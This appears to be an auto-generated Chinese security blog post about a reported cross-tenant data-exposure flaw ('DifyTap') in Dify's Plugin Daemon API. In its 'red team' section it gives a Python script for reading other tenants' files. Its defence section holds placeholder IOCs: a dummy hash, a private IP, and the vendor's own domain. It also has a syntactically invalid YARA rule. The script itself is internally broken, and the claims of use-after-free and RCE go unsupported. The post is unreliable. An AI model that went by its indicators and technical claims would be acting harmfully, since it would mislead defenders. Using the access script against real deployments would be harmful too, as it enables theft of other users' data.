---
layout: post
title:  "Researchers Detail DifyTap Flaws in Dify That Could Expose AI Chats Across Tenants"
date:   2026-06-22 20:36:49 +0000
categories: [security]
severity: critical
---

# 🚨 解析 DifyTap：多租戶 AI 平台的隱藏漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.4)
> * **受駭指標**: Info Leak 和 RCE
> * **關鍵技術**: `Path Traversal`, `Authorization Bypass`, `Use-after-free`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Dify 的 Plugin Daemon API 沒有正確檢查用戶身份和權限，導致攻擊者可以跨租戶存取其他用戶的數據。
* **攻擊流程圖解**:
  1. 攻擊者註冊 Dify 帳戶
  2. 攻擊者發送未經授權的請求到 Plugin Daemon API
  3. Plugin Daemon API 未檢查用戶身份和權限
  4. 攻擊者可以跨租戶存取其他用戶的數據
* **受影響元件**: Dify 版本 1.14.1 及之前版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要註冊 Dify 帳戶
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 註冊 Dify 帳戶
    username = "attacker"
    password = "password"
    response = requests.post("https://dify.com/register", data={"username": username, "password": password})
    
    # 發送未經授權的請求到 Plugin Daemon API
    api_url = "https://dify.com/plugin-daemon/api"
    response = requests.get(api_url, headers={"Authorization": "Bearer " + response.json()["token"]})
    
    # 跨租戶存取其他用戶的數據
    tenant_id = "other-tenant-id"
    file_id = "other-file-id"
    response = requests.get(api_url + "/files/" + tenant_id + "/" + file_id, headers={"Authorization": "Bearer " + response.json()["token"]})
    
    ```
* **繞過技術**: 攻擊者可以使用 `Path Traversal` 技術來繞過 Plugin Daemon API 的權限檢查

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | dify.com | /plugin-daemon/api |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule DifyTap {
      meta:
        description = "DifyTap 攻擊偵測規則"
        author = "Blue Team"
      strings:
        $api_url = "https://dify.com/plugin-daemon/api"
      condition:
        $api_url in (http.request.uri)
    }
    
    ```
* **緩解措施**: 更新 Dify 到版本 1.14.2 或以上，並設定 Plugin Daemon API 的權限檢查

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Path Traversal (路徑遍歷)**: 想像攻擊者可以遍歷目錄結構，存取未經授權的檔案。技術上是指攻擊者可以操控 URL 路徑來存取未經授權的資源。
* **Authorization Bypass (授權繞過)**: 想像攻擊者可以繞過授權機制，存取未經授權的資源。技術上是指攻擊者可以操控授權機制來存取未經授權的資源。
* **Use-after-free (用後釋放)**: 想像攻擊者可以使用已經釋放的記憶體，導致程式崩潰或執行任意代碼。技術上是指攻擊者可以操控記憶體管理來執行任意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/researchers-detail-difytap-flaws-in.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


